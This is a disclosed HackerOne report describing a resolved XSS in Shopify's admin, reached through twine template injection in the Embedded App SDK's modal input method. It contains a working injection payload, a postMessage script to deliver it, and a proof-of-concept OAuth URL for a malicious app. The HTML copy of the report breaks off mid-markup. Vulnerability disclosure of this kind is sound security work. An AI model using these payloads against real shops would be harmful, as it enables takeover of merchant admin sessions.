{"id":217790,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTc3OTA=","url":"https://hackerone.com/reports/217790","title":"XSS in $shop$.myshopify.com/admin/ via twine template injection in \"Shopify.API.Modal.input\" method when using a malicious app","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-04-02T02:33:01.281Z","submitted_at":"2017-04-02T02:33:01.281Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bored-engineer","url":"/bored-engineer","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-06-01T16:42:17.056Z","bug_reporter_agreed_on_going_public_at":"2017-06-01T16:42:17.009Z","team_member_agreed_on_going_public_at":"2017-05-29T19:13:01.081Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Description\nThe Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method. While the method automatically provides input escaping the \"input\" template (used by the `Shopify.API.Modal.input` method) assigns a value to a special `data-define` attribute. While it's not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by [twine](http://shopify.github.io/twine/). Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application. \n\n#Technical Details\nWhen the `Shopify.API.Modal.input` method the following \"input\" template is rendered using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method: \n```html\n...\n\u003cdiv class=\"ui-modal__body\" data-define=\"{typedInput: \u0026#39;[%= value %]\u0026#39;}\"\u003e\n...\n\u003clabel class=\"next-label\" for=\"text-a10e7047a92878fc20031f40da0b5231\"\u003e\u003c/label\u003e\n\u003cinput type=\"text\" id=\"text-a10e7047a92878fc20031f40da0b5231\" data-bind=\"typedInput\" autofocus=\"autofocus\" class=\"next-input\" /\u003e\n...\n\u003cbutton class=\"btn close-modal [%= buttonClass %]\" data-bind-event-click=\"closeModal({result: true, data: typedInput})\" type=\"button\" name=\"button\"\u003e[%= okButton %]\u003c/button\u003e\n...\n```\nThe `typedInput` parameter is initialized from the `value` template parameter, bound to the text input, and finally used when the \"okButton\" is clicked. The data binding is handled by Shopify's [twine](http://shopify.github.io/twine/) JS library. Unfortunately because  [_.template](https://lodash.com/docs/4.17.4#template) is not fully context aware it will not provide JSON escaping for this parameter. For example if `value` is set to `some'value` the following invalid JSON will be created in the `data-define` attribute:\n```\n{typedInput: 'some'value'}\n```\nNormally this would just break the intended functionality, however if we analyze [twine](http://shopify.github.io/twine/) we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373] method:\n```js\nwrapFunctionString = function(code, args, node) {\n  var e, error, keypath;\n  if (isKeypath(code) \u0026\u0026 (keypath = keypathForKey(node, code))) {\n    if (keypath[0] === '$root') {\n      return function($context, $root) {\n        return getValue($root, keypath);\n      };\n    } else {\n      return function($context, $root) {\n        return getValue($context, keypath);\n      };\n    }\n  } else {\n    code = \"return \" + code;\n    if (nodeArrayIndexes(node)) {\n      code = \"with($arrayPointers) { \" + code + \" }\";\n    }\n    if (requiresRegistry(args)) {\n      code = \"with($registry) { \" + code + \" }\";\n    }\n    try {\n      return new Function(args, \"with($context) { \" + code + \" }\");\n    } catch (error) {\n      e = error;\n      throw \"Twine error: Unable to create function on \" + node.nodeName + \" node with attributes \" + (stringifyNodeAttributes(node));\n    }\n  }\n};\n``` \nThe method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the `value` template parameter it will flow as follows:\n```\n'-alert(document.domain)-'\n``` \nThis will result in a `data-define` attribute with the following value:\n```js\n{typedInput:''-document.domain-''}\n```\nThis will result in the following code executing within twine:\n```js\nwith($context) {\n  with($registry) {\n    return {typedInput: ''-alert(document.domain)-''}\n  }\n}\n```\nPutting this all together with the SDK we get the following script:\n```js\nwindow.parent.postMessage(JSON.stringify({\n  message: \"Shopify.API.Modal.input\",\n  data: {\n    message: {\n      message: \"\", \n      value: \"'-alert(document.domain)-'\",\n    }\n  }\n}), \"*\");\n```\n#Exploitability\nYou need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. \n\n#Proof of Concept\nI've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...\nOpen the following URL on on `$your-shop$.myshopify.com`:\n```\n/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04\u0026scope=read_products\u0026redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html\u0026state=nonce\n```\nAfter authorizing the application an alert should appear on the `/admin` window containing `document.domain`.\n\n#Remediation\nThe \"input\" template should be updated to make the `value` parameter context-aware, perhaps wrapping in a `JSON.stringify` call.","vulnerability_information_html":"\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eThe Shopify \u003ca href=\"/redirect?url=https%3A%2F%2Fhelp.shopify.com%2Fapi%2Fsdks%2Fmerchant-apps%2Fembedded-app-sdk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eEmbedded App SDK\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is used to facilitate limited interactions with parent page (\u003ccode\u003e/admin/apps/$id\u003c/code\u003e) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using \u003ca href=\"/redirect?url=https%3A%2F%2Flodash.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003elodash\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026#39;s \u003ca href=\"/redirect?url=https%3A%2F%2Flodash.com%2Fdocs%2F4.17.4%23template\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e_.template\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e method. While the method automatically provides input escaping the \u0026quot;input\u0026quot; template (used by the \u003ccode\u003eShopify.API.Modal.input\u003c/code\u003e method) assigns a value to a special \u003ccode\u003edata-define\u003c/code\u003e attribute. While it\u0026#39;s not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by \u003ca href=\"/redirect?url=http%3A%2F%2Fshopify.github.io%2Ftwine%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etwine\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application. \u003c/p\u003e\n\n\u003ch1 id=\"technical-details\"\u003eTechnical Details\u003c/h1\u003e\n\n\u003cp\u003eWhen the \u003ccode\u003eShopify.API.Modal.input\u003c/code\u003e method the following \u0026quot;input\u0026quot; template is rendered using \u003ca href=\"/redirect?url=https%3A%2F%2Flodash.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003elodash\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026#39;s \u003ca href=\"/redirect?url=https%3A%2F%2Flodash.com%2Fdocs%2F4.17.4%23template\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e_.template\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e method: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e...\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ui-modal__body\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-define=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;{typedInput: \u0026amp;#39;[%= value %]\u0026amp;#39;}\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n...\n\u003cspan class=\"nt\"\u003e\u0026lt;label\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;next-label\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003efor=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text-a10e7047a92878fc20031f40da0b5231\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/label\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text-a10e7047a92878fc20031f40da0b5231\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-bind=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;typedInput\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eautofocus=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;autofocus\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;next-input\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n...\n\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;btn close-modal [%= buttonClass %]\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-bind-event-click=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;closeModal({result: true, data: typedInput})\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;button\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;button\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e[%= okButton %]\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003etypedInput\u003c/code\u003e parameter is initialized from the \u003ccode\u003evalue\u003c/code\u003e template parameter, bound to the text input, and finally used when the \u0026quot;okButton\u0026quot; is clicked. The data binding is handled by Shopify\u0026#39;s \u003ca href=\"/redirect?url=http%3A%2F%2Fshopify.github.io%2Ftwine%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etwine\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e JS library. Unfortunately because  \u003ca href=\"/redirect?url=https%3A%2F%2Flodash.com%2Fdocs%2F4.17.4%23template\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e_.template\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is not fully context aware it will not provide JSON escaping for this parameter. For example if \u003ccode\u003evalue\u003c/code\u003e is set to \u003ccode\u003esome\u0026#39;value\u003c/code\u003e the following invalid JSON will be created in the \u003ccode\u003edata-define\u003c/code\u003e attribute:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{typedInput: \u0026#39;some\u0026#39;value\u0026#39;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNormally this would just break the intended functionality, however if we analyze \u003ca href=\"/redirect?url=http%3A%2F%2Fshopify.github.io%2Ftwine%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etwine\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[\u003ca title=\"https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FShopify%2Ftwine%2Fblob%2F24c4ccfccf5b50937e6d9e433676651549be1497%2Fdist%2Ftwine.js%23L373\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e] method:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ewrapFunctionString\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003enode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ekeypath\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisKeypath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekeypath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ekeypathForKey\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003enode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekeypath\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e$root\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$context\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003e$root\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003egetValue\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$root\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ekeypath\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$context\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003e$root\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003egetValue\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$context\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ekeypath\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ereturn \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003enodeArrayIndexes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003enode\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ewith($arrayPointers) { \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e }\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003erequiresRegistry\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ewith($registry) { \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e }\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eFunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ewith($context) { \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e }\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eTwine error: Unable to create function on \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003enode\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003enodeName\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e node with attributes \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estringifyNodeAttributes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003enode\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe method wraps the attribute value in a \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FStatements%2Fwith\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewith\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e block to provide named variables and passes it to a \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FFunction\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFunction\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the \u003ccode\u003evalue\u003c/code\u003e template parameter it will flow as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026#39;-alert(document.domain)-\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis will result in a \u003ccode\u003edata-define\u003c/code\u003e attribute with the following value:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003etypedInput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edomain\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis will result in the following code executing within twine:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003ewith\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$context\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003ewith\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$registry\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003etypedInput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edomain\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan 